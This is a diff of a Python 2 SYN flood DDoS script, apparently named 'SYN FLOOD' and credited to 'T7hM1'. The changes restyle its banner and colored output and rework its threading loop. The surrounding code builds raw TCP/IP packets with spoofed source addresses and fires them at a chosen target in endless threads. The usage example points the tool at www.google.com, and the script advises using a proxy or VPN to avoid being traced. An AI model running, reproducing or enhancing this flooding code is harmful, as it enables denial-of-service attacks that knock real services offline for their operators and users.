@@ -2,18 +2,15 @@
 
 
 title = """
-\t\t++++++++++++++++++++++++++++++++++++++++++
-\t\t+    ___       ___  ___  ____  ____      +  
-\t\t+   / _ \__ __/ _ \/ _ \/ __ \/ __/      +
-\t\t+  / ___/ // / // / // / /_/ /\ \        + 
-\t\t+ /_/   \_, /____/____/\____/___/        +
-\t\t+      /___/                             +
-\t\t+ DDOS with python script                +
-\t\t+ Version:0.1                            +
-\t\t+ Author:_____T7hM1_____                 +
-\t\t+ Source:https://github.com/t7hm1/       +
-\t\t+ddos-python-script/blob/master/pyddos.py+
-\t\t++++++++++++++++++++++++++++++++++++++++++
+  _______     ___   _   ______ _      ____   ____  _____                
+ / ____\ \   / / \ | | |  ____| |    / __ \ / __ \|  __ \               
+| (___  \ \_/ /|  \| | | |__  | |   | |  | | |  | | |  | |  _ __  _   _ 
+ \___ \  \   / | . ` | |  __| | |   | |  | | |  | | |  | | | '_ \| | | |
+ ____) |  | |  | |\  | | |    | |___| |__| | |__| | |__| | | |_) | |_| |
+|_____/   |_|  |_| \_| |_|    |______\____/ \____/|_____/  | .__/ \__, |
+                                                           | |     __/ |
+                                                           |_|    |___/ v.1.0
+                       ___T7hM1___
 """
 
 from random import *
@@ -21,7 +18,9 @@ from socket import *
 from struct import *
 from threading import *
 from argparse import ArgumentParser
+from termcolor import colored,cprint
 import sys,time,os
+import Queue
 
 
 
@@ -43,8 +42,6 @@ def syn_flood(tgt,prt,spf_ip,ts):
 		print '[-]',e
 		sys.exit()
 	sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
-
-	print '---> Bulding packet and start with %d threads' % ts
 
 	ihl=5
 	version=4
@@ -94,17 +91,20 @@ def syn_flood(tgt,prt,spf_ip,ts):
 	tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
 	packet = ip_header + tcp_header
 	try: 
-			sock.sendto(packet,(tgt,prt))
-			print '--->Sent packet to target'
-			screenLock.release()
-			time.sleep(.3)
+		sock.sendto(packet,(tgt,prt))
+		screenLock.acquire()
+		cprint('---> Sent packet to target','green')
+		time.sleep(.3)
 	except KeyboardInterrupt:
-			sys.exit()
+		sys.exit()
 	except Exception,e:
-			print '[-]',e
+		print '[-]',e
+	finally:
+		screenLock.release()
+
 
 def main():
-	print title
+	print colored(title,'red')
 	parser = ArgumentParser((sys.argv[0]) + ' -t [target] -i [spoof ip] -p [port] -T [threads]'
 		'\nExample: '+(sys.argv[0])+' -t www.google.com -p 80 -T 200')
 	parser.add_argument('-t',   '--target',default=False,help='Sepcify your target host')
@@ -118,15 +118,15 @@ def main():
 	else:
 		permisson = os.getuid()
 		if permisson == 0:
-			print '[+] You have enough permisson to run this script'
+			print colored('[+] You have enough permisson to run this script','green')
 		else:
-			print '[-] Required root to run this script'
+			cprint('[-] Required root to run this script','red')
 			sys.exit()
 		time.sleep(2)
 		try:
-			print '====================SYN FLOOD==================='
-			print '[!!] Warning,i recommend you to use proxy or vpn to protect yourself'
-			print '[!!] Continue = "ENTER" | Exit = "CTRL+c"'
+			cprint('====================SYN FLOOD===================','red','on_green')
+			cprint('[!!] Warning,i recommend you to use proxy or vpn to protect yourself','red')
+			cprint('[!!] Continue = "ENTER" | Exit = "CTRL+c"','red')
 			raw_input("")
 		except KeyboardInterrupt:
 			sys.exit()
@@ -142,14 +142,13 @@ def main():
 		global screenLock
 		screenLock = Semaphore(value=ts)
 		while True:
-			try:
-				t = Thread(target=syn_flood,args=(tgt,prt,spf_ip,ts))
-				t.daemon = True
-				t.start()
-				screenLock.acquire()
-			except KeyboardInterrupt:
-				pass
-				sys.exit()
+			for i in range(0,ts):
+				try:
+					t = Thread(target=syn_flood,args=(tgt,prt,spf_ip,ts))
+					t.daemon = True
+					t.start()
+				except KeyboardInterrupt:
+					sys.exit(colored('[-] Canceled by user','red'))
 
 if __name__ == '__main__':
 	main()
